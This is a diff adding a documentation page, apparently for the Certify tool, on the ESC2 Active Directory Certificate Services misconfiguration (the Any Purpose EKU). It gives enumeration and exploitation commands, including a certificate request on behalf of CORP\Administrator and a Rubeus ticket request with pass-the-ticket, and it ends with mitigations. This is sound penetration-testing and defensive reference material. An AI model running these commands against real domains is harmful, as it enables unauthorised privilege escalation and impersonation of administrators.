@@ -1,0 +1,161 @@
+---
+title: 'ESC2 - Misconfigured Any Purpose Templates'
+description: 'Exploit certificate templates with overly broad Extended Key Usages (Any Purpose EKU) to bypass certificate restrictions.'
+icon: 'key'
+sidebarTitle: 'ESC2'
+---
+
+ESC2 is a misconfiguration in Active Directory Certificate Services (AD CS), which stems from excessively broad Extended Key Usages (EKUs). Specifically, if a certificate template has been configured with the `Any Purpose` (`2.5.29.37.0`) EKU or as a `Subordinate CA` (No EKUs), the certificate can be used in place of any other EKU without restrictions.
+
+<Info>
+This vulnerability allows certificates to be used for any purpose, effectively bypassing EKU restrictions and enabling various attack scenarios.
+</Info>
+
+## Vulnerability Criteria
+
+The following criteria comprise an ESC2 vulnerability:
+
+<Accordion title="Enterprise CA Enrollment Rights">
+The enterprise CA grants enrollment rights to the attacker-controlled user. Otherwise, the user would be unable to request any certificates from the CA.
+</Accordion>
+
+<Accordion title="Template Enrollment Rights">
+The certificate template grants enrollment rights to the attacker-controlled user. Otherwise, the user would be unable to request certificates based on the specific template.
+</Accordion>
+
+<Accordion title="Manager Approval Disabled">
+The "manager approval" feature is disabled for the certificate template. Otherwise, a "CA Manager" would have to manually review and approve the certificate request.
+</Accordion>
+
+<Accordion title="Authorized Signature Disabled">
+The "authorized signature" feature is disabled for the certificate template. Otherwise, an enrollment agent would need to sign the certificate request on behalf of the requester.
+</Accordion>
+
+<Accordion title="Unrestricted EKU">
+The certificate template defines an Extended Key Usage (EKU) that has no restrictions:
+- `Any Purpose` (`2.5.29.37.0`)
+- `Subordinate CA` (No EKUs)
+</Accordion>
+
+## Enumeration
+
+We can search for certificate templates with these conditions using the `enum-templates --filter-vulnerable` command from Certify. For more information about the command and its parameters, please refer to the [Command Overview](./1-command-overview) page.
+
+<CodeGroup>
+```bash PowerShell
+Certify.exe enum-templates --filter-enabled --filter-vulnerable --hide-admins
+```
+
+```bash Command Prompt
+Certify.exe enum-templates --filter-enabled --filter-vulnerable --hide-admins
+```
+</CodeGroup>
+
+<Tip>
+Look for templates with "Any Purpose" EKU or Subordinate CA configurations in the output.
+</Tip>
+
+```text Sample Output
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ '__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v2.0.0
+
+[*] Action: Find certificate templates
+[*] Using the search base 'CN=Configuration,DC=corp,DC=local'
+[*] Classifying vulnerabilities in the context of built-in low-privileged domain groups.
+
+[*] Listing info about the enterprise certificate authority 'CORP-CA01-CA'
+
+    ...
+
+[*] Enabled certificate templates found using the current filter parameters:
+
+    Template Name                         : CustomAnyPurpose
+    Enabled                               : True
+    Publishing CAs                        : ca01.corp.local\CORP-CA01-CA
+    Schema Version                        : 2
+    Validity Period                       : 1 year
+    Renewal Period                        : 6 weeks
+    Certificate Name Flag                 : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_ALT_REQUIRE_EMAIL, SUBJECT_REQUIRE_EMAIL, SUBJECT_REQUIRE_DIRECTORY_PATH
+    Enrollment Flag                       : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
++   Manager Approval Required             : False
++   Authorized Signatures Required        : 0
++   Extended Key Usage                    : Any Purpose
+    Certificate Application Policies      : Any Purpose
+    Vulnerabilities
++     ESC2                                : The template has the 'Any Purpose' EKU.
+    Permissions
+      Enrollment Permissions
++       Enrollment Rights           : CORP\Domain Users               S-1-5-21-976219687-1556195986-4104514715-513
+      Object Control Permissions
+
+Certify completed in 00:00:00.6948033
+```
+
+## Exploitation
+
+Since the certificate can be used for any purpose, it is possible to use it as a `Certificate Request Agent` (`Enrollment Agent`) and mimic the abuse scenario for [ESC3](./esc3-misconfigured-certificate-request-agent).
+
+<Warning>
+ESC2 certificates can be used for multiple attack vectors due to their unrestricted nature.
+</Warning>
+
+### Attack Scenarios
+
+<Card title="Certificate Request Agent Abuse" icon="user-shield">
+The main difference between ESC2 and ESC3 is that the EKUs for the `Enrollment Agent` certificates are different (`Any Purpose` / `Subordinate CA` vs `Certificate Request Agent`). While both allow enrollment on-behalf-of other users for any schema version 1 template, they require their own EKU to be present in the `Required Application Policies` for a schema version 2 (or above) template.
+</Card>
+
+### Certificate Request
+
+<CodeGroup>
+```bash Basic Request
+Certify.exe request --ca ca01.corp.local\CORP-CA01-CA --template CustomAnyPurpose
+```
+
+```bash Specific User Context
+Certify.exe request --ca ca01.corp.local\CORP-CA01-CA --template CustomAnyPurpose --subject "CN=attackeruser,OU=Users,DC=corp,DC=local"
+```
+</CodeGroup>
+
+### Usage as Enrollment Agent
+
+Once you have obtained a certificate with the "Any Purpose" EKU, you can use it to request certificates on behalf of other users by leveraging it as an enrollment agent certificate.
+
+<CodeGroup>
+```bash Request for Another User
+Certify.exe request --ca ca01.corp.local\CORP-CA01-CA --template User --on-behalf-of CORP\Administrator --enrollment-cert [BASE64_CERT] --enrollment-cert-pw [PASSWORD]
+```
+
+```bash Alternative Approach
+# Use the Any Purpose certificate for client authentication
+Rubeus.exe asktgt /user:targetuser /certificate:[ANY_PURPOSE_CERT] /ptt
+```
+</CodeGroup>
+
+## Relationship to Other ESCs
+
+<Card title="ESC3 Connection" icon="link">
+ESC2 certificates with "Any Purpose" EKU can be used in the same way as ESC3 Certificate Request Agent certificates, making them functionally equivalent for enrollment agent attacks.
+</Card>
+
+## Mitigation
+
+<Card title="Defense Recommendations" icon="shield-check">
+- Replace "Any Purpose" EKU with specific, required EKUs
+- Avoid using Subordinate CA templates for end-user certificates
+- Implement proper template access controls
+- Regular auditing of certificate template EKU configurations
+- Consider using Application Policies instead of EKUs for more granular control
+</Card>
+
+## References
+
+- [Certified Pre-Owned: Abusing Active Directory Certificate Services](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
+- [Microsoft Certificate Template EKU Documentation](https://docs.microsoft.com/en-us/windows/win32/seccertenroll/about-certificate-template-eku)
